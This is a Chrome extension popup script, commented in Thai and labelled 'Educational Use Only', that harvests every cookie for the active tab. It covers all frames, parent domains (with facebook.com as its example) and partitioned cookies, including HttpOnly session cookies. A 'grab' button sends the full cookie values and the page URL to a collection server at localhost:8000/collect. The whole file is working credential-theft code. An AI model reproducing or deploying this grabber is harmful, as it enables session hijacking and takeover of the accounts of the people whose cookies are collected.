// ================================================
// Cookie Demo Pro — Educational Use Only
// ================================================

const SERVER_URL = "http://localhost:8000/collect";

// ---- Utility: หน่วงเวลา ----
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ---- Utility: ดึง hostname จาก URL อย่างปลอดภัย ----
function safeHostname(urlStr) {
  try {
    return new URL(urlStr).hostname;
  } catch {
    return null;
  }
}

// ---- Utility: สร้าง candidate domains จาก hostname ----
// ตัวอย่าง: "www.facebook.com" → ["www.facebook.com", "facebook.com", ".facebook.com"]
function buildDomainCandidates(hostname) {
  if (!hostname) return [];
  const parts = hostname.split(".");
  const candidates = new Set();

  // ใส่ hostname เดิม
  candidates.add(hostname);

  // ใส่ทุก suffix ที่เป็นไปได้
  // www.facebook.com → facebook.com, com
  for (let i = 1; i < parts.length; i++) {
    const domain = parts.slice(i).join(".");
    candidates.add(domain);
    candidates.add("." + domain);
  }

  return [...candidates];
}

// ================================================
// ฟังก์ชันหลัก: ดึง Cookie ให้ครบแบบ Cookie-Editor
// ================================================
async function getAllCookiesForTab(tab) {
  const collected = new Map(); // key = name|domain|path|partitionKey
  const sources = [];

  // ---------- Source 1: ดึงจาก URL ตรงๆ (แม่นสุด) ----------
  try {
    const byUrl = await chrome.cookies.getAll({ url: tab.url });
    sources.push(`[URL] ${tab.url} → ${byUrl.length} cookies`);
    for (const c of byUrl) {
      const key = `${c.name}|${c.domain}|${c.path}|${c.partitionKey?.topLevelSite || ""}`;
      collected.set(key, c);
    }
  } catch (e) {
    sources.push(`[URL] error: ${e.message}`);
  }

  // ---------- Source 2: ดึงจากทุก frame ในแท็บ (รวม iframe) ----------
  let frames = [];
  try {
    frames = await chrome.webNavigation.getAllFrames({ tabId: tab.id });
    sources.push(`[Frames] พบ ${frames.length} frame`);
  } catch (e) {
    sources.push(`[Frames] error: ${e.message}`);
  }

  // ---------- Source 3: ดึงจาก candidate domains ทั้งหมด ----------
  const allHostnames = new Set();
  allHostnames.add(safeHostname(tab.url));

  for (const f of frames || []) {
    const h = safeHostname(f.url);
    if (h) allHostnames.add(h);
  }

  // เพิ่ม candidate domains ของแต่ละ hostname
  const candidateDomains = new Set();
  for (const h of allHostnames) {
    if (!h) continue;
    for (const c of buildDomainCandidates(h)) {
      candidateDomains.add(c);
    }
  }

  sources.push(`[Domains] ตรวจสอบ ${candidateDomains.size} domain candidates`);

  // ---- Query แต่ละ domain ----
  for (const domain of candidateDomains) {
    try {
      const cookies = await chrome.cookies.getAll({ domain });
      for (const c of cookies) {
        const key = `${c.name}|${c.domain}|${c.path}|${c.partitionKey?.topLevelSite || ""}`;
        collected.set(key, c);
      }
    } catch (e) {
      // บาง domain อาจ error (เช่นไม่มี permission) — ข้ามไป
    }
  }

  // ---------- Source 4: ดึง partitioned cookies (CHIPS) ----------
  // ลองทั้ง topLevelSite ของแท็บเอง และ .facebook.com
  const partitionSites = new Set();
  partitionSites.add(`https://${safeHostname(tab.url)}`);
  partitionSites.add(tab.url.split("?")[0]);

  for (const site of partitionSites) {
    for (const domain of candidateDomains) {
      try {
        const cookies = await chrome.cookies.getAll({
          domain,
          partitionKey: { topLevelSite: site }
        });
        for (const c of cookies) {
          const key = `${c.name}|${c.domain}|${c.path}|${c.partitionKey?.topLevelSite || ""}`;
          collected.set(key, c);
        }
      } catch {
        // ไม่ error ถ้า Chrome ไม่รองรับ
      }
    }
  }

  sources.push(`[Total] รวมได้ ${collected.size} cookies (unique)`);

  return {
    cookies: [...collected.values()],
    sources
  };
}

// ================================================
// UI Helpers
// ================================================
const statusEl = document.getElementById("status");
const logEl = document.getElementById("log");
const summaryEl = document.getElementById("summary");

function setStatus(text, cls = "") {
  statusEl.textContent = text;
  statusEl.className = cls;
}

function log(line) {
  logEl.textContent += line + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}

function clearLog() {
  logEl.textContent = "";
  summaryEl.textContent = "";
}

function renderSummary(cookies, sources) {
  const httpOnly = cookies.filter(c => c.httpOnly).length;
  const secure = cookies.filter(c => c.secure).length;
  const partitioned = cookies.filter(c => c.partitionKey).length;

  summaryEl.innerHTML =
    `รวม <b>${cookies.length}</b> cookies | ` +
    `HttpOnly: <b>${httpOnly}</b> | ` +
    `Secure: <b>${secure}</b> | ` +
    `Partitioned: <b>${partitioned}</b>`;

  log("--- Sources ---");
  sources.forEach(s => log("  " + s));
  log("--- Cookie List ---");
  cookies.forEach(c => {
    const flags = [
      c.httpOnly ? "HttpOnly" : null,
      c.secure ? "Secure" : null,
      c.partitionKey ? "Partitioned" : null
    ].filter(Boolean).join(",");
    log(`  ${c.domain}${c.path} | ${c.name} = ${c.value.substring(0, 50)}${c.value.length > 50 ? "..." : ""}${flags ? " [" + flags + "]" : ""}`);
  });
}

// ================================================
// Action: ดึง Cookie + ส่ง Server
// ================================================
document.getElementById("grab").addEventListener("click", async () => {
  clearLog();
  setStatus("กำลังดึง cookie...");

  try {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab || !tab.url) {
      setStatus("❌ ไม่พบแท็บ", "err");
      return;
    }

    const protocol = new URL(tab.url).protocol;
    if (!["http:", "https:"].includes(protocol)) {
      setStatus("❌ หน้านี้ไม่รองรับ (ไม่ใช่ http/https)", "err");
      return;
    }

    const { cookies, sources } = await getAllCookiesForTab(tab);
    renderSummary(cookies, sources);

    if (cookies.length === 0) {
      setStatus("⚠️ ไม่พบ cookie", "warn");
      return;
    }

    // ---- สร้าง payload ----
    const payload = {
      source_url: tab.url,
      hostname: safeHostname(tab.url),
      timestamp: new Date().toISOString(),
      count: cookies.length,
      cookies: cookies.map(c => ({
        name: c.name,
        value: c.value,
        domain: c.domain,
        path: c.path,
        secure: c.secure,
        httpOnly: c.httpOnly,
        sameSite: c.sameSite,
        session: c.session,
        expirationDate: c.expirationDate,
        partitionKey: c.partitionKey || null
      }))
    };

    // ---- ส่งไป server ----
    setStatus("กำลังส่งไป server...");
    const res = await fetch(SERVER_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (res.ok) {
      setStatus(`✅ ส่งสำเร็จ (${cookies.length} cookies)`, "ok");
    } else {
      setStatus(`❌ Server ตอบ ${res.status}`, "err");
    }

  } catch (err) {
    setStatus(`❌ Error: ${err.message}`, "err");
    console.error(err);
  }
});

// ================================================
// Action: Preview เท่านั้น (ไม่ส่ง)
// ================================================
document.getElementById("preview").addEventListener("click", async () => {
  clearLog();
  setStatus("กำลัง preview cookie...");

  try {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab || !tab.url) {
      setStatus("❌ ไม่พบแท็บ", "err");
      return;
    }

    const { cookies, sources } = await getAllCookiesForTab(tab);
    renderSummary(cookies, sources);
    setStatus(`พบ ${cookies.length} cookies`, "ok");

  } catch (err) {
    setStatus(`❌ Error: ${err.message}`, "err");
    console.error(err);
  }
});

// ================================================
// Action: ล้าง Log
// ================================================
document.getElementById("clear").addEventListener("click", () => {
  clearLog();
  setStatus("พร้อมทำงาน");
});